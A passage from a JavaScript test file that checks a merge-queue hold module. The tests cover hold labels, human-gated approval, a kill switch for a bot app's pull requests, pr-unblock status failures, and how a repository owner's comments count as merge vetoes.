    assert.deepEqual(holdsModule.queueHolds({ pull: queuedPull({ labels: [{ name: "bug" }, { name: label }] }), statuses: [] }), [want], label);
  }
  assert.equal(holdsModule.queueHolds({ pull: queuedPull({ labels: [{ name: "do-not-merge" }, { name: "needs-human" }] }), statuses: [] }).length, 2);
});

test("security: outside-actor is a hold label of its own, beside the human-gated one", async () => {
  assert.equal(holdsModule.OUTSIDE_ACTOR_LABEL, "security: outside-actor");
  const { HOLD_LABELS } = await import("./enable-auto-merge.mjs");
  assert.ok(HOLD_LABELS.includes(holdsModule.OUTSIDE_ACTOR_LABEL), HOLD_LABELS.join(", "));
  const { LABEL } = await import("../security-outside-actor/flag.mjs");
  assert.equal(LABEL, holdsModule.OUTSIDE_ACTOR_LABEL);
});

test("queueHolds: the human-gated label is the tracker's, trimmed, else needs-human", () => {
  const tracker = { config: { role_labels: { "human-gated": "  hitl " } } };
  assert.deepEqual(holdsModule.queueHolds({ pull: queuedPull({ labels: [{ name: "needs-human" }] }), statuses: [], tracker }), []);
  assert.deepEqual(holdsModule.queueHolds({ pull: queuedPull({ labels: [{ name: "hitl" }] }), statuses: [], tracker }), [
    "#7 carries 'hitl'; the merge queue removes it. Removing the label approves this pull request; re-queue it to merge.",
  ]);
  for (const blank of [{ config: { role_labels: { "human-gated": " " } } }, { config: {} }, [], "x", null]) {
    assert.equal(holdsModule.humanGatedLabel(blank), "needs-human", JSON.stringify(blank));
  }
});

test("queueHolds: a pr-unblock stop on the head holds; a newer success or another account's status does not", () => {
  const lane = { login: "github-actions[bot]" };
  const failure = { context: "pr-unblock/fix-ci", state: "failure", creator: lane, description: "The lane stopped" };
  assert.deepEqual(holdsModule.queueHolds({ pull: queuedPull(), statuses: [failure] }), [
    `'pr-unblock/fix-ci' is failure on ${QUEUED}: The lane stopped. The lane that stopped clears it by running again on this head, or a new head carries none.`,
  ]);
  assert.deepEqual(holdsModule.queueHolds({ pull: queuedPull(), statuses: [{ ...failure, state: "success" }, failure] }), []);
  assert.deepEqual(holdsModule.queueHolds({ pull: queuedPull(), statuses: [{ ...failure, creator: { login: "someone" } }] }), []);
});

test("queueHolds: the kill switch holds only the lanes App's pull request, until both read false", () => {
  const app = { user: { id: 99, type: "Bot" } };
  const text =
    "#7: the lanes kill switch is on (CLAUDE_LANES_DISABLED or CLAUDE_LANES_REPO_DISABLED is not 'false'), so no lanes App pull request merges; it merges once both read 'false' and ci-status is re-run, which the lost-runs reconciler does when this is the run's only failure.";
  for (const [name, lanes] of [
    ["on", { ...ON, disabled: "true" }],
    ["repo on", { ...ON, repoDisabled: "1" }],
    ["unset", { appId: "99" }],
  ]) {
    assert.deepEqual(holdsModule.queueHolds({ pull: queuedPull(app), statuses: [], lanes }), [text], name);
  }
  assert.deepEqual(holdsModule.queueHolds({ pull: queuedPull(app), statuses: [], lanes: ON }), []);
  assert.deepEqual(holdsModule.queueHolds({ pull: queuedPull(), statuses: [], lanes: { appId: "99", disabled: "true" } }), [], "a person's");
  assert.deepEqual(holdsModule.queueHolds({ pull: queuedPull({ user: { id: 99, type: "User" } }), statuses: [], lanes: { appId: "99" } }), [], "a User with the id");
  assert.deepEqual(holdsModule.queueHolds({ pull: queuedPull(app), statuses: [], lanes: { appId: "", disabled: "true" } }), [], "no app id");
});

test("queueHolds: a pull request, label list or status list that does not read throws", () => {
  assert.throws(() => holdsModule.queueHolds({ pull: { number: 7, head: {} }, statuses: [] }), /does not read/);
  assert.throws(() => holdsModule.queueHolds({ pull: queuedPull({ labels: null }), statuses: [] }), /labels are not a list/);
  assert.throws(() => holdsModule.queueHolds({ pull: queuedPull(), statuses: {} }), /not a list/);
});

// A member naming "the do-not-merge label" is not asking to hold the merge.
// A sentence that says not to merge still holds, and so does a comma list,
// which cannot be told from a comma clause.
test("a member naming the do-not-merge label is no veto; saying not to merge is", () => {
  const said = (body) => [{ login: "kyle-sexton", isUser: true, association: "OWNER", at: "2026-10-30T01:00:00Z", body }];
  for (const body of [
    "Apply the `do-not-merge` label before writing any explanation.",
    "Removed the do-not-merge label; the hold reason is gone.",
  ]) {
    assert.deepEqual(holdsModule.vetoers(said(body)), [], body);
  }
  for (const body of [
    "Do not merge this yet.",
    "don't merge",
    "do-not-merge",
    "do-not-merge: waiting on #10954",
    "Not ready, do-not-merge until Friday.",
    "The checks are failing, do-not-merge until they pass.",
    "`do-not-merge` label please",
    "Hold on, do-not-merge, I'm still reviewing.",
    "Every hold stays: ci-status, gitleaks, do-not-merge, cost holds.",
  ]) {
    assert.deepEqual(holdsModule.vetoers(said(body)), ["kyle-sexton"], body);
  }
});
